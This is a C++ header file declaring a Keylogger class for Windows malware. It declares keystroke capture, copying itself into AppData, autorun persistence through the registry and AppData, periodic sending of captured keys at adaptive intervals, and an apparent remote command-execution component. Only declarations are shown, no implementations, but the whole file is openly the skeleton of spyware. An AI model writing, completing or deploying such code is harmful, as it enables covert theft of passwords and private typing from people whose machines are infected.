#pragma once
#include "stdafx.h"
#include "CommandExe.h"

const int V_SEND_INTERVAL_MIN = 1000;
const int V_SEND_INTERVAL_MAX = 10000;
const int V_IDLE_TIME = 1;

class Keylogger
{
public:
	Keylogger();
	~Keylogger();
    
	void Run();
	void Stop();
    bool SetAutorun(bool autorun);

private:
    bool CopyTo(TCHAR* path);
    bool SetAutorunAppdata(bool autorun);
    bool SetAutorunRegistry(bool autorun);

    void CheckKey(short vkey, bool shift);
    void Send();
	void IncreaseSendInterval();
	void DecreaseSendInterval();

	bool shouldStop;
	DWORD sendInterval;

    CommandExe cmd;

    std::vector<const char*> keysPressed;
    bool keysActive[256 + 1];

    TCHAR exeName[MAX_PATH];
    TCHAR appDataPath[1024];
    TCHAR registryPath[1024];

	char sendBuf[2<<13];
};

extern Keylogger keylogger;